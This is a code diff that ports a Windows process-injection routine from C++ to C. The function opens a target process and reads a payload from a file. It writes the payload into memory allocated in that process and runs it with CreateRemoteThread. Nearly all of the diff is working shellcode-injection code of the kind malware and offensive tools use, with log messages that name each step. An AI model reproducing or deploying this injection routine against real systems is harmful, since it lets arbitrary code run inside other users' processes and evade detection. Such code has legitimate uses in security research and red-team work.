@@ -1,6 +1,6 @@
-#include "crt.hpp"
+#include "crt.h"
 
-#include "logger.hpp"
+#include "logger.h"
 
 #include <tlhelp32.h>
 
@@ -9,7 +9,7 @@
 
 static inline
 char* extract_bytes_from_file(const char* f, size_t* size) {
-    FILE* fp = nullptr;
+    FILE* fp = NULL;
 
     if ( !(fopen_s(&fp, f, "rb")) ) {
         fclose(fp);
@@ -26,12 +26,13 @@ char* extract_bytes_from_file(const char* f, size_t* size) {
     return bytesRead;
 }
 
-std::int32_t create_remote_thread(const types::parsed_args_t& args) {
-    std::size_t       size = 0;
+enum status_t create_remote_thread(const struct parsed_args_t* args)
+{
+    size_t       size = 0;
 
-    HANDLE process_handle = args.process_id  == 0 ?
-        nullptr :
-        OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, args.process_id);
+    HANDLE process_handle = args->process_id  == 0 ?
+        NULL :
+        OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, args->process_id);
     LOG_MSG(args, "Opening target process..", 0);
     if (!process_handle) {
         LOG_MSG(args, "Failed to acquire handle to target", 0);
@@ -41,9 +42,9 @@ std::int32_t create_remote_thread(const types::parsed_args_t& args) {
     LOG_MSG(args, "Process Handle to target acquired", 0);
 
     LOG_MSG(args, "Allocating virtual memory to target..", 0);
-    char* payload = extract_bytes_from_file(args.relative_payload_path.data(), &size);
+    char* payload = extract_bytes_from_file(args->payload_path, &size);
     // LOG MSG about bytes
-    types::exec_mem_t exec_mem = (types::exec_mem_t)VirtualAllocEx(process_handle, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    exec_mem_t exec_mem = (exec_mem_t)VirtualAllocEx(process_handle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!exec_mem) {
         LOG_MSG(args, "Failed to allocate memory to target", 0);
         printf("exec_mem: %p\n", exec_mem);
@@ -53,7 +54,7 @@ std::int32_t create_remote_thread(const types::parsed_args_t& args) {
     LOG_MSG(args, "Allocation successful", 0);
 
     LOG_MSG(args, "Writing payload to executable memory..", 0);
-    if (!(WriteProcessMemory(process_handle, (LPVOID)exec_mem, (LPVOID)payload, size, nullptr))) {
+    if (!(WriteProcessMemory(process_handle, (LPVOID)exec_mem, (LPVOID)payload, size, NULL))) {
         LOG_MSG(args, "Failed to write payload to executable memory", 0);
         free(payload);
         CloseHandle(process_handle);
@@ -74,7 +75,7 @@ std::int32_t create_remote_thread(const types::parsed_args_t& args) {
     LOG_MSG(args, "Protection changed", 0);
 
     LOG_MSG(args, "Creating remote thread..", 0);
-    HANDLE hThread = CreateRemoteThread(process_handle, nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
+    HANDLE hThread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
     if (!hThread) { 
         LOG_MSG(args, "Failed to create remote thread", 0);
         VirtualFreeEx(process_handle, exec_mem, size, MEM_RELEASE);
